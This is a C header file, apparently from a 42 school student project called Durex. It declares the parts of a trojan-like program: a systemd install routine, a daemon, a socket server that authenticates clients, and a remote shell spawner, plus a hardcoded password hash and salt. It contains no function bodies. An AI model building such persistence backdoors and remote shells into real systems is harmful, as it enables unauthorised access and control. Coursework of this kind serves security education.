/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/02/08 14:19:30 by user42            #+#    #+#             */
/*   Updated: 2022/02/16 11:00:44 by user42           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef DUREX_H
# define DUREX_H

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <poll.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <crypt.h>

# define	DUREX_BIN		0
# define	DUREX_DAEMON	1

# define	DAEMON			0
# define	SHELL			1

# define	CMD_OUT_MAX		2048

# define	RECV_SIZE		4096

# define	HASHED_PASSWD	"42WDwZekFhiD."
# define	SALT			"42"

typedef struct				s_durex_bin
{
	char					*systemd_folder;
	char					*config_path;
}							t_durex_bin;


typedef struct				s_client
{
	int						fd;
	int						id;
	int						auth;
	pid_t					pid;
	struct s_client			*next;
}							t_client;

typedef struct				s_server
{
	int						server_mode;

	int						listen_sd;
	int						last_id;
	int						client_nb;

	struct pollfd			*pfds;
	int						nfds;

	char					buff[RECV_SIZE];

	t_client				*clients;
	int						shell_started;
}							t_server;



/* ===== Durex binary functions ===== */
void				durex_bin(void);

/* ===== Durex daemon functions ===== */
// Daemon
void				durex_daemon(void);

// Shell
void				durex_shell(t_server *server);

// Server
void				setup_server(t_server *server);
void				rm_client(t_server *server, t_client *client);
void				shutdown_connection(t_server *server, t_client *client);
int					add_client_to_list(t_server *server, int new_sd);
void				authenticate(t_server *server, t_client *client);
void				reject_client(t_server *server, int fd);
void				add_client(t_server *server);
int					add_shell_client(t_server *server);
void				reset_server(t_server *server);

// Utilities
void				fatal(t_server *server);
t_client			*get_client_from_id(t_server *server, int id);
t_client			*get_client_from_fd(t_server *server, int fd);
void				send_info(t_server *server, int fd, char *info);
void				send_info_all(t_server *server, char *info);




/* ===== CMD utilities ===== */
void				clear_env(void);
int					exec_safe(char *cmd, char **args);
int					exec_safe_w_output(char *cmd, char **const args, char *cmd_outbuf);




# endif
